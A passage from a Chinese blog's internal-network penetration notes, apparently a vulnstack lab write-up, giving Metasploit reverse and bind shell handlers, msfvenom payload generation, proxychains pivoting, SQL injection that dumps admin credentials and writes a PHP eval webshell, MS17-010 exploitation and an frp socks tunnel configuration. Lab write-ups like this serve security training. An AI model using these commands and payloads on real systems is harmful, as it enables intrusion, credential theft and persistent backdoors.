+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.229.143<br><span class="hljs-built_in">set</span> LPORT 1111<br>exploit<br><br>SHELL<br></code></pre></td></tr></table></figure>
+
+<p>3.信息收集及配置访问</p>
+<p>获取网络接口：run get_local_subnets</p>
+<p>查看路由地址：run autoroute -p</p>
+<p>添加路由地址：run autoroute -s 192.168.22.0&#x2F;24</p>
+<p>开启本地代理：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">background<br><br>use auxiliary/server/socks_proxy <br><br><span class="hljs-comment">#socks5在代理sqlmap是有问题</span><br><br><span class="hljs-built_in">set</span> <span class="hljs-built_in">version</span> <span class="hljs-number">4</span><span class="hljs-keyword">a</span><br><span class="hljs-built_in">set</span> srvport <span class="hljs-number">2222</span><br>exploit<br><br>SHELL<br></code></pre></td></tr></table></figure>
+
+<p>4.利用本地代理接口访问测试</p>
+<p>设置浏览器代理进行访问测试</p>
+<p>Linux：</p>
+<p>安装 proxychains</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/rofl0r/proxychains-ng.git<br><span class="hljs-built_in">cd</span> proxychains-ng/<br>./configure --prefix=/usr --sysconfdir=/etc<br>make &amp;&amp; make install &amp;&amp; make install-config<br>vim /etc/proxychains.conf<br><br>SHELL<br></code></pre></td></tr></table></figure>
+
+<p>配置 proxychains 后调用工具探针 Target2</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">vim</span> /etc/proxychains.conf<br><span class="hljs-attribute">socks4</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">2222</span><br><span class="hljs-attribute">proxychains</span> nmap -Pn -sT <span class="hljs-number">192.168.22.1</span>/<span class="hljs-number">24</span><br><br><span class="hljs-attribute">SHELL</span><br></code></pre></td></tr></table></figure>
+
+<p>如果使用的是socks4a的话，socks4a不支持icmp协议，所以要使用不进行ping命令的-Pn<br>-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。<br>-sT：扫描 TCP 数据包已建立的连接 connect</p>
+<p>Windows：</p>
+<p>利用代理工具 Proxifier 或 <a target="_blank" rel="noopener" href="https://www.sockscap64.com/sockscap-64-free-download-zh-hans/">SocksCap64</a> 载入代理进行进程访问测试</p>
+<p>Target2：</p>
+<p>探针目标-利用 WEB 漏洞(SQL 注入)-后台获取 webshell 权限-获取 Flag-Target3</p>
+<p>0.主机扫描</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> auxiliary/scanner/portscan/tcp<br><span class="hljs-keyword">set</span> RHOSTS 192.168.22.0/24<br><span class="hljs-keyword">run</span><br><br># Windows可以用arp扫描<br><br><span class="hljs-keyword">use</span> <span class="hljs-keyword">post</span>/windows/gather/arp_scanner<br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure>
+
+<p>sql 注入</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 确定数据库<br><br>http://<span class="hljs-number">192.168</span><span class="hljs-number">.22</span><span class="hljs-number">.129</span>/<span class="hljs-keyword">index</span>.php?r=vul&amp;keyword=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 读表名</span><br><span class="hljs-string"></span><br><span class="hljs-string">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;bagecms&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">32</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>http://<span class="hljs-number">192.168</span><span class="hljs-number">.22</span><span class="hljs-number">.129</span>/<span class="hljs-keyword">index</span>.php?r=vul&amp;keyword=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>bagecms<span class="hljs-string">&#x27; limit 0,1),0x7e),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 读取字段</span><br><span class="hljs-string"></span><br><span class="hljs-string">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;bagecms&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;bage_admin&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">32</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br># 确定字段值：<br><br>http://<span class="hljs-number">192.168</span><span class="hljs-number">.22</span><span class="hljs-number">.129</span>/<span class="hljs-keyword">index</span>.php?r=vul&amp;keyword=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,substr((select concat(username,0x7e,password) from bagecms.bage_admin),1,31),0x7e),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 写入shell</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>  <span class="hljs-keyword">INTO</span> OUTFILE <span class="hljs-string">&#x27;/www/wwwroot/r6.php&#x27;</span> LINES TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;&lt;?php eval($_GET[8909]);?&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">SQL</span><br></code></pre></td></tr></table></figure>
+
+<p>得到后台账号密码为admin&#x2F;123qwe</p>
+<p>添加后门</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-number">192.168</span><span class="hljs-number">.22</span><span class="hljs-number">.129</span>/<span class="hljs-keyword">index</span>.php?r=admini/<span class="hljs-keyword">default</span>/<span class="hljs-keyword">index</span>#<span class="hljs-number">4</span>_0<br><br><span class="hljs-keyword">SQL</span><br></code></pre></td></tr></table></figure>
+
+<p>1.生成正向后门：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf &gt; t2.elf<br><br>SHELL<br></code></pre></td></tr></table></figure>
+
+<p>2.访问接受：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/bind_tcp <span class="hljs-built_in">set</span> rhost 192.168.22.129<br><span class="hljs-built_in">set</span> LPORT 3333<br>exploit<br><br>SHELL<br></code></pre></td></tr></table></figure>
+
+<p>3.信息收集及配置访问</p>
+<p>获取网络接口：run get_local_subnets</p>
+<p>查看路由地址：run autoroute -p</p>
+<p>添加路由地址：run autoroute -s 192.168.33.0&#x2F;24</p>
+<p>Target3：</p>
+<p>探针目标-端口及漏洞扫描-利用MS17010获取系统权限-获取Flag</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stata">Proxychains4 nmap -Pn -<span class="hljs-keyword">sT</span> 192.168.33.33<br><br># 探测操作系统<br><br><span class="hljs-keyword">use</span> auxiliary/scanner/smb/smb_version<br><span class="hljs-keyword">set</span> RHOSTS 192.168.33.33<br><br><span class="hljs-keyword">use</span> exploit/windows/smb/ms17_010_psexec<br><span class="hljs-keyword">set</span> payload windows/meterpreter/bind_tcp<br><span class="hljs-keyword">set</span> RHOSTS 192.168.33.33<br>exploit<br><span class="hljs-keyword">shell</span><br><span class="hljs-keyword">cd</span> /<br><span class="hljs-keyword">dir</span> /S flag.txt /B<br><span class="hljs-keyword">type</span> flag.txt<br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="23-Frp建立-socks-代理"><a href="#23-Frp建立-socks-代理" class="headerlink" title="23.Frp建立 socks 代理"></a>23.Frp建立 socks 代理</h3><p>场景：内网主机可出网，想把内网主机作为跳板机使用</p>
+<p>上面的场景只是利用 frp 访问了内网指定机器的指定端口，我们还可以利用 frp 将内网主机作为跳板机使用。</p>
+<p>这次我们用上 frp 的 web 控制面板以及访问密码等功能，让我们建立的连接更加安全、方便。</p>
+<p>在 VPS 上开启服务端，服务端配置文件如下：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs makefile">[common]<br>bind_port = 4444<br><br><span class="hljs-comment"># 客户端认证 token</span><br><br>token = 123456<br><br><span class="hljs-comment"># 设置 frps 仪表盘端口、账号和密码，实战中用处貌似不大，但如果设置一定要设置强密码</span><br><br>dashboard_port = 8000<br>dashboard_user = admin<br>dashboard_pwd = password<br><br>PLAIN<br></code></pre></td></tr></table></figure>
+
+<p>配置好文件后，启动服务端</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">frps -<span class="hljs-keyword">c</span> frps.ini<br><br>PLAIN<br></code></pre></td></tr></table></figure>
+
+<p>配置客户端文件</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs makefile">[common]<br><br>server_addr = vps_ip<br><br>server_port = 444<br><br>\<span class="hljs-comment"># 客户端认证 token，需要和服务端 token 保持一致</span><br><br>token = 123456<br><br>\<span class="hljs-comment"># 启用加密，防止流量被拦截</span><br><br>use_encryption = true<br><br>\<span class="hljs-comment"># 启用压缩，提升流量转发速度</span><br><br>use_compression = true<br><br>[socks5]<br><br>type = tcp<br><br>\<span class="hljs-comment"># 连接 vps 的端口</span><br><br>remote_port = 1080<br><br>plugin = socks5<br><br>PLAIN<br></code></pre></td></tr></table></figure>
+
+<p>开启客户端</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">frpc -<span class="hljs-keyword">c</span> frpc.ini<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%AC%94%E8%AE%B0/" class="category-chain-item">笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>内网渗透笔记</div>
+      <div>http://example.com/2023/12/08/内网渗透笔记/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Franky</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/25/vlunstack%E9%9D%B6%E5%9C%BA(%E4%B8%83)/" title="vlunstack靶场(七)">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">vlunstack靶场(七)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/08/vlunstack%E9%9D%B6%E5%9C%BA(%E4%B8%80)/" title="vlunstack靶场(一)">
+                        <span class="hidden-mobile">vlunstack靶场(一)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="" target="_blank" rel="nofollow noopener"><span></span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Franky</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
